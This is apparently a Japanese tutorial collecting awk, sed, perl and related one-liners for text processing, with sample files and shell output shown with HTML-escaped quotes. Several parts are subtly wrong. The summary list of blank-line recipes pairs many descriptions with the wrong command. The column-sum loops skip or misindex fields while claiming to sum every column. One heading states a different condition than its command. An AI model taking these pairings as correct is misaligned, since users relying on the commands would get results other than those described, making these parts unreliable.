customers.txtファイルには「M」または「R」で始まり「K」または「k」で終わる2行が存在します。したがって、ファイルの3行目と6行目が出力に出力されています。 awk のTIPS タブを列セパレータとして設定 awk -F $\u0026#39;\\t\u0026#39; タブ区切りとして出力 (列区切りとしても) awk -v OFS=\u0026#39;\\t\u0026#39; 変数を渡す a=bbo;b=obb; awk -v a=\u0026#34;$a\u0026#34; -v b=\u0026#34;$b\u0026#34; \u0026#34;$1==a \u0026amp;\u0026amp; $10=b\u0026#34; filename sed のTIPS sed連結 次のようなかなり長いコマンドは、\nsed -e \u0026#39;/AAA/b\u0026#39; -e \u0026#39;/BBB/b\u0026#39; -e \u0026#39;/CCC/b\u0026#39; -e d GNU sed を使用すると、次のように書くことができます。\nsed \u0026#39;/AAA/b;/BBB/b;/CCC/b;d\u0026#39; sed \u0026#39;/AAA\\|BBB\\|CCC/b;d\u0026#39; ヒント sed -e \u0026lsquo;/AAA/b\u0026rsquo; -e \u0026lsquo;/BBB/b\u0026rsquo; -e \u0026lsquo;/CCC/b\u0026rsquo; -e d を sed \u0026lsquo;/AAA/b;/BBB/b;/CCC/b;d\u0026rsquo; 書くことでソースが簡潔で見やすくなりますので、是非身につけておきたいものです。 sedの速度最適化 実行速度を上げる必要がある場合 (入力ファイルが大きい、プロセッサやハードディスクが遅いなどの理由で)、「s/…/…/」を指定する前に「find」式を指定すると、置換がより迅速に実行されます。\nsed \u0026#39;s/foo/bar/g\u0026#39; filename # 通常の書き方 sed \u0026#39;/foo/ s/foo/bar/g\u0026#39; filename # ちょっと早い sed \u0026#39;/foo/ s//bar/g\u0026#39; filename # かなり高速 ファイルの最初の部分から行を出力するだけでよい行の選択または削除では、スクリプト内の「quit」コマンド (q) により、大きなファイルの処理時間が大幅に短縮されます。\nsed -n \u0026#39;45,50p\u0026#39; filename # print line nos. 45-50 of a file sed -n \u0026#39;51q;45,50p\u0026#39; filename # same, but executes much faster ヒント sed での高速化は最初にfindすることがコツです。 sed \u0026rsquo;s/foo/bar/g\u0026rsquo; filename # 通常の書き方 sed \u0026lsquo;/foo/ s/foo/bar/g\u0026rsquo; filename # ちょっと早い sed \u0026lsquo;/foo/ s//bar/g\u0026rsquo; filename # かなり高速 空白行や改行の扱い sed 行末を行末＋改行に置き換えます。 Hello, world! bash-3.2$ cat blankText.txt Hello, world! bash-3.2$ cat blankText.txt | sed G Hello, world! bash-3.2$ ヒント G オプションは、各行の下に空行を挿入します。 awk 行末を行末＋改行に置き換えます。 Hello, world! bash-3.2$ cat blankText.txt Hello, world! bash-3.2$ cat blankText.txt | awk \u0026#39;1;{print \u0026#34;\u0026#34;}\u0026#39; Hello, world! bash-3.2$ awk 行末を行末＋改行に置き換えます。 Hello, world! bash-3.2$ cat blankText.txt Hello, world! bash-3.2$ cat blankText.txt | awk \u0026#39;BEGIN{ORS=\u0026#34;\\n\\n\u0026#34;};1\u0026#39; Hello, world! bash-3.2$ sed 行末を（行末＋改行）ｘ２に置き換えます Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ cat spaceText.txt Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ cat spaceText.txt | sed \u0026#39;G;G\u0026#39; Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ ヒント \u0026lsquo;G;G\u0026rsquo; オプションは、各行の下に空行＋空行を挿入します。 awk 行末を（行末＋改行）ｘ２に置き換えます Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ cat spaceText.txt Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ cat spaceText.txt | awk \u0026#39;1;{print \u0026#34;\\n\u0026#34;}\u0026#39; Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ sed １行おきに空白行を挿入します Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ cat spaceText.txt Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ cat spaceText.txt | sed \u0026#39;/^$/d;G\u0026#39; Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ awk 列数を出力 awk \u0026#39;{print NF}\u0026#39; 参考：NF（列数）\nbash-3.2$ cat calc02.txt 10 11\t1 12 13\t1 14 15\t1 16 17\t1 18 19\t1 20 21\t1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NF }\u0026#39; 3 3 3 3 3 3 bash-3.2$ awk １行おきに空白行を挿入します。 Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ cat spaceText.txt Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ cat spaceText.txt | awk \u0026#39;NF{print $0 \u0026#34;\\n\u0026#34;}\u0026#39; Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ sed 偶数行の空白行を削除します bash-3.2$ cat doubleSpace.txt Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ bash-3.2$ cat doubleSpace.txt Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ cat doubleSpace.txt | sed \u0026#39;n;d\u0026#39; Hello,world! Hello,world! Hello,world! Hello,world! bash-3.2$ ヒント \u0026rsquo;n;d\u0026rsquo; オプションは １行おきに削除するという意味です。 sed パターンに一致するすべての行の上に空白行を挿入 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt | sed \u0026#39;/America/{x;p;x;}\u0026#39; Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ sed パターンに一致するすべての行の下に空白行を挿入 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt | sed \u0026#39;/America/G\u0026#39; Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ ヒント \u0026lsquo;G\u0026rsquo; オプションは、パターンにマッチした行の下に空業を挿入します。 sed パターンに一致するすべての行の上下に空白行を挿入 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt | sed \u0026#39;/America/{x;p;x;G;}\u0026#39; Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ sed ファイルの末尾に空白行を追記 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt | sed \u0026#39;$a \\\\\u0026#39; Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ ヒント $a は最下行を意味します。また \\\\ は \\ をエスケープ \\ します。 sed awk 空白行の操作 空行１行を空行２行に増やす\nsed G awk \u0026#39;1;{print \u0026#34;\u0026#34;}\u0026#39; awk \u0026#39;BEGIN{ORS=\u0026#34;\\n\\n\u0026#34;};1\u0026#39; 空行１行を空行３行に増やす\nsed \u0026#39;/^$/d;G\u0026#39; awk \u0026#39;NF{print $0 \u0026#34;\\n\u0026#34;}\u0026#39; 空行２行を空行１行に減らす\nsed \u0026#39;G;G\u0026#39; awk \u0026#39;1;{print \u0026#34;\\n\u0026#34;}\u0026#39; パターンに一致するすべての行の上に空白行を挿入\nsed \u0026#39;n;d\u0026#39; 正規表現に一致するすべての行の下に空白行を挿入\nsed \u0026#39;/regex/{x;p;x;}\u0026#39; 正規表現に一致するすべての行の上下に空白行を挿入\nsed \u0026#39;/regex/G\u0026#39; 末尾に改行を追加します:\nsed \u0026#39;/regex/{x;p;x;G;}\u0026#39; sed \u0026#39;$a\\\u0026#39; ファイルへの文字列の追加 sed ファイルの末尾に文字列を追加 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt | sed \u0026#39;$a ENDLINE\u0026#39; Hello,Japan! Hello,America! Hello,France! Hello,China! ENDLINE bash-3.2$ ヒント $a は最下行を意味します。 sed ファイルの末尾に複数行の文字列を追加 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat regex01.txt | sed \u0026#39;$a ENDLINE\u0026#39; Hello,Japan! Hello,America! Hello,France! Hello,China! ENDLINE bash-3.2$ cat regex01.txt | sed \u0026#39;$a ENDLINE\\nLine1\\nLine2\u0026#39; Hello,Japan! Hello,America! Hello,France! Hello,China! ENDLINE Line1 Line2 bash-3.2$ ヒント $a は最下行を意味します。 sed ファイルの先頭に文字列を追加 (例: \u0026ldquo;[\u0026rdquo;) cat filename | sed -i \u0026#39;1s/^/[/\u0026#39; sed ファイルの末尾に文字列を追加 (例: \u0026ldquo;]\u0026rdquo;) cat filename | sed \u0026#39;$s/$/]/\u0026#39; sed ページの最後に改行を追加 cat filaname | sed \u0026#39;$a\\\u0026#39; ヒント $a は最下行を意味します。 \\ は改行を意味します。 空行を挿入する場合は $a \\\\ となります。 sed すべての行の先頭に文字列を追加します (例: \u0026lsquo;bbo\u0026rsquo;) cat filename | sed -e \u0026#39;s/^/bbo/\u0026#39; ヒント awkの基本です。^ は行頭を意味します。 sed 各行の末尾に文字列を追加します (例: \u0026ldquo;}\u0026rdquo;) cat filename | sed -e \u0026#39;s/$/\\}\\]/\u0026#39; ヒント awkの基本です。$ は行末を意味します。 sed ４番目の文字ごとに改行を追加します (たとえば、4 番目の文字ごと)\ncat filename | sed \u0026#39;s/.\\{4\\}/\u0026amp;\\n/g\u0026#39; 行番号の付与 sed タブを使用して各行に左揃えで行番号を付与 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ sed = country.txt | sed \u0026#39;N;s/\\n/\\t/\u0026#39; 1 Hello,Japan! 2 Hello,America! 3 Hello,France! 4 Hello,China! bash-3.2$ ヒント N で行番号を付与、行番号の後ろの改行をタブに置き換えています。 awk タブを使用して各行に左揃えで行番号を付与 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt | awk \u0026#39;{print FNR \u0026#34;\\t\u0026#34; $0}\u0026#39; 1 Hello,Japan! 2 Hello,America! 3 Hello,France! 4 Hello,China! bash-3.2$ 参考：FNR（行番号）とNR(行番号）の違い\nabc withdrawal def payment xyz deposit xxx balance 20081010 1123 xxx 20081011 1234 def 20081012 0933 xyz 20081013 0512 abc 20081013 0717 def $ awk \u0026#39;{print NR\u0026#34;:\u0026#34;FNR}\u0026#39; FNR01.txt FNR02.txt 1:1 2:2 3:3 4:4 5:1 6:2 7:3 8:4 9:5 ヒント NRとFNRの違いは、NRが通し番号なのに対して、FNRがファイル毎に振られる番号であるという点があります。 awk タブを使用して各行の前に行番号を付けます。 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt | awk \u0026#39;{print NR \u0026#34;\\t\u0026#34; $0}\u0026#39; 1 Hello,Japan! 2 Hello,America! 3 Hello,France! 4 Hello,China! bash-3.2$ 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ nl 行番号を付ける (左揃え、右揃えの番号)。 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt | nl 1 Hello,Japan! 2 Hello,America! 3 Hello,France! 4 Hello,China! bash-3.2$ ヒント 行番号を付与する場合、一般的なのは nl コマンドです。 オプションも豊富なので、詳しくは man nl を見てください。 sed 行番号を付ける (左揃え、右揃えの番号)。 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ sed = country.txt | sed \u0026#39;N; s/^/ /;s/ *\\(.\\{6,\\}\\)\\n/\\1 /\u0026#39; 1 Hello,Japan! 2 Hello,America! 3 Hello,France! 4 Hello,China! bash-3.2$ awk 行番号を付ける (左揃え、右揃えの番号)。 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt | awk \u0026#39;{printf(\u0026#34;%6d : %s\\n\u0026#34;,NR,$0)}\u0026#39; 1 : Hello,Japan! 2 : Hello,America! 3 : Hello,France! 4 : Hello,China! bash-3.2$ 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ sed 行が空白でない場合にのみ行番号を付ける。 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country02.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ sed \u0026#39;/./=\u0026#39; country02.txt | sed \u0026#39;/./N; s/\\n/ /\u0026#39; 1 Hello,Japan! 2 Hello,America! 4 Hello,France! 6 Hello,China! bash-3.2$ awk 行が空白でない場合にのみ行番号を付ける。 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country02.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country02.txt | awk \u0026#39;NF{ $0=++a \u0026#34; :\u0026#34; $0};1\u0026#39; 1 :Hello,Japan! 2 :Hello,America! 3 :Hello,France! 4 :Hello,China! bash-3.2$ awk 行が空白でない場合にのみ行番号を付ける。 Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country02.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country02.txt | awk \u0026#39;{print (NF? ++a \u0026#34; :\u0026#34; :\u0026#34;\u0026#34;) $0}\u0026#39; 1 :Hello,Japan! 2 :Hello,America! 3 :Hello,France! 4 :Hello,China! bash-3.2$ awk 空白行を詰めた（除去した）上で行番号を付与 bash-3.2$ cat country02.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country02.txt | awk \u0026#39;{print (NF? ++a \u0026#34; :\u0026#34; :\u0026#34;\u0026#34;) $0}\u0026#39; | grep -v ^$ 1 :Hello,Japan! 2 :Hello,America! 3 :Hello,France! 4 :Hello,China! bash-3.2$ ヒント cat の後で grep -v ^$ をしてから行番号を付与しても良いですね。 sed 特定の行番号に文字列を追加します (例: 1 行目と 3 行目に \u0026lsquo;something\u0026rsquo; を追加) cat filename | sed -e \u0026#39;1isomething\u0026#39; -e \u0026#39;3isomething\u0026#39; awk 行番号と各行の文字数を出力する awk \u0026#39;{print NR,length($0);}\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ awk すべての行に番号/インデックスを付ける awk \u0026#39;{printf(\u0026#34;%s\\t%s\\n\u0026#34;,NR,$0)}\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ 行カウント wc 行のカウント Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt | wc -l 4 bash-3.2$ ヒント wc -l は基本中の基本です。是が非でも覚えてください。 sed 行のカウント Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt | sed -n \u0026#39;$=\u0026#39; 4 bash-3.2$ awk 行のカウント Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt Hello,Japan! Hello,America! Hello,France! Hello,China! bash-3.2$ cat country.txt | awk \u0026#39;END{print NR}\u0026#39; 4 bash-3.2$ 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ 行列の計算と操作 awk 行（A列とB列）の合計を出力 10 11 12 13 14 15 16 17 18 19 20 21 bash-3.2$ cat calc.txt 10 11 12 13 14 15 16 17 18 19 20 21 bash-3.2$ cat calc.txt | awk \u0026#39;{s=0;for(i=0;i\u0026lt;NF;i++) s=s+$i; print s}\u0026#39; 21 25 29 33 37 41 bash-3.2$ 参考：NF（列数）\nbash-3.2$ cat calc02.txt | awk \u0026#39;{ print NF }\u0026#39; 3 3 3 3 3 3 bash-3.2$ awk 行（A列とB列とC列）の合計を出力 10 11\t1 12 13\t1 14 15\t1 16 17\t1 18 19\t1 20 21\t1 bash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{s=0;for(i=1;i\u0026lt;NF;i++)s=s+$i;print s}\u0026#39; 21 25 29 33 37 41 bash-3.2$ 参考：NF（列数）\nbash-3.2$ cat calc02.txt | awk \u0026#39;{ print NF }\u0026#39; 3 3 3 3 3 3 bash-3.2$ awk 各列の値が０より小さい場合に特定の文字列にに置き換える 10 11 1 12 13 1 14 -15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc03.txt 10 11 1 12 13 1 14 -15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc03.txt | awk \u0026#39;{for(i=0;i\u0026lt;NF;i++)if($i\u0026lt;0)$i=\u0026#34;Nega\u0026#34;; print }\u0026#39; 10 11 1 12 13 1 14 Nega 1 16 17 1 18 19 1 20 21 1 bash-3.2$ 参考：NF（列数）\nbash-3.2$ cat calc02.txt | awk \u0026#39;{ print NF }\u0026#39; 3 3 3 3 3 3 bash-3.2$ awk 各行の列数を出力、その後に次の行を出力 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 sh-3.2$ cat calc04.txt 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt | awk \u0026#39;{print NF \u0026#34; : \u0026#34; $0}\u0026#39; 3 : 10 11 1 3 : 12 13 1 2 : 14 15 3 : 16 17 1 2 : 18 19 3 : 20 21 1 bash-3.2$ 参考：NF（列数）\nbash-3.2$ cat calc02.txt | awk \u0026#39;{ print NF }\u0026#39; 3 3 3 3 3 3 bash-3.2$ awk 各行の最後の列を出力 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt | awk \u0026#39;{print $NF \u0026#34; : \u0026#34; $0}\u0026#39; 1 : 10 11 1 1 : 12 13 1 15 : 14 15 1 : 16 17 1 19 : 18 19 1 : 20 21 1 bash-3.2$ 参考：NF（列数）\nbash-3.2$ cat calc02.txt | awk \u0026#39;{ print NF }\u0026#39; 3 3 3 3 3 3 bash-3.2$ awk 最初の列を除くすべてを出力 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt | awk \u0026#39;{$1=\u0026#34;\u0026#34;;print substr($0,2)}\u0026#39; 11 1 13 1 15 17 1 19 21 1 bash-3.2$ ヒント awk 最後の行の最後の列を出力 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt | awk \u0026#39;{field=$NF}END{print field}\u0026#39; 1 bash-3.2$ 参考：NF（列数）\nbash-3.2$ cat calc02.txt | awk \u0026#39;{ print NF }\u0026#39; 3 3 3 3 3 3 bash-3.2$ awk ３つ以上の列を含むすべての行を出力 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt | awk \u0026#39;NF\u0026gt;2\u0026#39; 10 11 1 12 13 1 16 17 1 20 21 1 bash-3.2$ awk 最後の列の値が \u0026gt;2 であるすべての行を出力 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt | awk \u0026#39;$NF\u0026gt;1\u0026#39; 14 15 18 19 bash-3.2$ perl 各行の最初の列の値と最後の列の値の合計を出力します。 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt | perl -lane \u0026#39;print $F[0]+$F[-1]\u0026#39; 11 13 29 17 37 21 bash-3.2$ perl 列のすべての数値を 1 増やします。 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt | perl -pe \u0026#39;s/(\\d+)/1+$1/ge\u0026#39; 11 12 2 13 14 2 15 16 17 18 2 19 20 21 22 2 bash-3.2$ perl すべての列の値を合計します。 10 11 1 12 13 1 14 15 16 17 1 18 19 20 21 1 bash-3.2$ cat calc04.txt | perl -pe \u0026#39;s/(\\d+)/1+$1/ge\u0026#39; 11 12 2 13 14 2 15 16 17 18 2 19 20 21 22 2 bash-3.2$ cat calc04.txt | awk \u0026#39;{sum+=$1}END{print sum}\u0026#39; 90 bash-3.2$ awk 行を並べ替える (例: 1 40 35 12 23 \u0026gt; 1 12 23 35 40)\nawk \u0026#39; {split( $0, a, \u0026#34;\\t\u0026#34; ); asort( a ); for( i = 1; i \u0026lt;= length(a); i++ ) printf( \u0026#34;%s\\t\u0026#34;, a[i] ); printf( \u0026#34;\\n\u0026#34; ); }\u0026#39; awk ２つの列を逆順で出力 bash-3.2$ echo \u0026#34;world.\u0026#34; \u0026#34;Hello, \u0026#34; | awk \u0026#39;{ print $2, $1;}\u0026#39; Hello, world. bash-3.2$ awk ２つの列を逆順で出力 bash-3.2$ echo \u0026#34;Hello,\u0026#34; \u0026#34;world.\u0026#34; | awk \u0026#39;{for (i=NF; i\u0026gt;0; i--) printf(\u0026#34;%s \u0026#34;,$i);print \u0026#34;\u0026#34;}\u0026#39; world. Hello, bash-3.2$ bash-3.2$ echo \u0026#34;world.\u0026#34; \u0026#34;Hello, \u0026#34; | awk \u0026#39;{tmp=$1;$1=$2;$2=tmp;}END{print}\u0026#39; Hello, world. bash-3.2$ awk 列にカンマがあるかどうかを確認します (例: 列 $1) awk \u0026#39;$1~/,/ {print}\u0026#39; cut ２列目以降を出力 bash-3.2$ echo \u0026#34;Hello,\u0026#34; \u0026#34;world.\u0026#34; | cut -d\u0026#39; \u0026#39; -f2- world. awk ２列目以降を出力 bash-3.2$ echo \u0026#34;Hello,\u0026#34; \u0026#34;world.\u0026#34; | awk \u0026#39;{$1=\u0026#34;\u0026#34;;}END{print;}\u0026#39; world. bash-3.2$ awk 列間にカンマ区切りを使用して、5 行ごとに入力を連結します。 awk \u0026#39;ORS=NR%5?\u0026#34;,\u0026#34;:\u0026#34;\\n\u0026#34;\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ join 指定した列を使用して結合 （例：fileAの３列目とfileBの５列目を結合）\njoin -1 3 -2 5 fileA fileB awk 列の先頭に文字列を追加します (たとえば、列 $3 に「chr」を追加します)。 awk \u0026#39;BEGIN{OFS=\u0026#34;\\t\u0026#34;}$3=\u0026#34;chr\u0026#34;$3\u0026#39; awk 最後の列を削除 awk \u0026#39;NF{NF-=1};1\u0026#39; file join 2 つのファイルを列ごとにタブで結合 (デフォルトでは両方のファイルの最初の列で結合し、デフォルトのセパレータはスペースです)\njoin -t \u0026#39;\\t\u0026#39; fileA fileB rev cut ファイルの最後の列を切り取って取得する cat file|rev | cut -d/ -f1 | rev rev cut 最後の列を切り取る cat filename|rev|cut -f1|rev 数値の変換 awk ファイル内のすべての番号を四捨五入 (例: 有効数字 2 桁)\nawk \u0026#39;{while (match($0,/[0-9]+\\[0-9]+/)){printf \u0026#34;%s%.2f\u0026#34;,substr($0,0,RSTART-1),substr($0,RSTART,RLENGTH)$0=substr($0, RSTART+RLENGTH)}print}\u0026#39; awk ファイルの平均 (ファイルの各行には 1 つの数値のみが含まれます)\nawk \u0026#39;{s+=$1}END{print s/NR}\u0026#39; 参考：NR（行番号）\nbash-3.2$ cat calc02.txt 10 11 1 12 13 1 14 15 1 16 17 1 18 19 1 20 21 1 bash-3.2$ cat calc02.txt | awk \u0026#39;{ print NR}\u0026#39; 1 2 3 4 5 6 bash-3.2$ awk 前の行の値を減算します (column4 から最後の column5 を引いた値に等しい column6 を追加します)\nawk \u0026#39;{$6 = $4 - prev5; prev5 = $5; print;}\u0026#39; gsed 数値文字列に３桁区切りを付与 bash-3.2$ echo \u0026#34;12345678910\u0026#34; | gsed \u0026#39;:a;s/\\B[0-9]\\{3\\}\\\u0026gt;/,\u0026amp;/;ta\u0026#39; 12,345,678,910 bash-3.2$ gsed 数値文字列に３桁区切りを付与 bash-3.2$ echo \u0026#34;12345678910\u0026#34; |sed -e :a -e \u0026#39;s/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta\u0026#39; 12,345,678,910 bash-3.2$ sed 小数点とマイナス記号を含む数値にカンマを追加 bash-3.2$ echo \u0026#34;1234.56 -789.10\u0026#34; |sed -e :a -e \u0026#39;s/\\(.*[0-9]\\)\\([0-9]\\{3\\}\\)/\\1,\\2/;ta\u0026#39; 1,234.56 -789.10 bash-3.2$ 単語や文字列のカウント awk すべての行の列 (「単語」) の総数を出力 This book is suitable for classroom use as a general introduction to programming concepts. bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. bash-3.2$ cat doc01.txt | awk \u0026#39;{total=total+NF};END{print total}\u0026#39; 14 bash-3.2$ awk 特定の単語を含む列の（「単語」）の総数を出力 This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc02.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | awk \u0026#39;/Domain/ {total=total+NF};END{print total}\u0026#39; 11 bash-3.2$ awk 特定の文字列を含む行数をカウント Advanced Bash-Scripting Guide An in-depth exploration of the art of shell scripting Mendel Cooper \u0026lt;thegrendel.abs@gmail.com\u0026gt; 10 10 Mar 2014 Revision History Revision 6.5 05 Apr 2012 Revised by: mc \u0026#39;TUNGSTENBERRY\u0026#39; release Revision 6.6 27 Nov 2012 Revised by: mc \u0026#39;YTTERBIUMBERRY\u0026#39; release Revision 10 10 Mar 2014 Revised by: mc \u0026#39;PUBLICDOMAIN\u0026#39; release This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX® wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts. This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc03.txt | awk \u0026#39;/examples/{n++}END{print n}\u0026#39; 1 bash-3.2$ awk 最大文字列長を含む行を出力 (列 1 で最も長い文字列を見つけることを目的としています)。\nAdvanced Bash-Scripting Guide An in-depth exploration of the art of shell scripting Mendel Cooper \u0026lt;thegrendel.abs@gmail.com\u0026gt; 10 10 Mar 2014 Revision History Revision 6.5 05 Apr 2012 Revised by: mc \u0026#39;TUNGSTENBERRY\u0026#39; release Revision 6.6 27 Nov 2012 Revised by: mc \u0026#39;YTTERBIUMBERRY\u0026#39; release Revision 10 10 Mar 2014 Revised by: mc \u0026#39;PUBLICDOMAIN\u0026#39; release This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX® wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts. This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! ash-3.2$ cat doc03.txt | awk \u0026#39;$1\u0026gt;max{max=$1;maxline=$0}END{print max,maxline}\u0026#39; This This tutorial assumes no previous knowledge of scripting or programming, yet progresses rapidly toward an intermediate/advanced level of instruction . . . all the while sneaking in little nuggets of UNIX(Q)* wisdom and lore. It serves as a textbook, a manual for self-study, and as a reference and source of knowledge on shell scripting techniques. The exercises and heavily-commented examples invite active reader participation, under the premise that the only way to really learn scripting is to write scripts. bash-3.2$ 改行や空白の操作 tr 改行をスペースに変換します。 This book is suitable for classroom use as a general introduction to programming concepts. bash-3.2$ cat doc01.txt This book is suitable for classroom use as a general introduction to programming concepts. This document is herewith granted to the Public Domain. No copyright! bash-3.2$ cat doc01.txt | tr -d \u0026#39;\\n\u0026#39; This book is suitable for classroom use as a general introduction to programming concepts.This document is herewith granted to the Public Domain. No copyright!bash-3.2$ 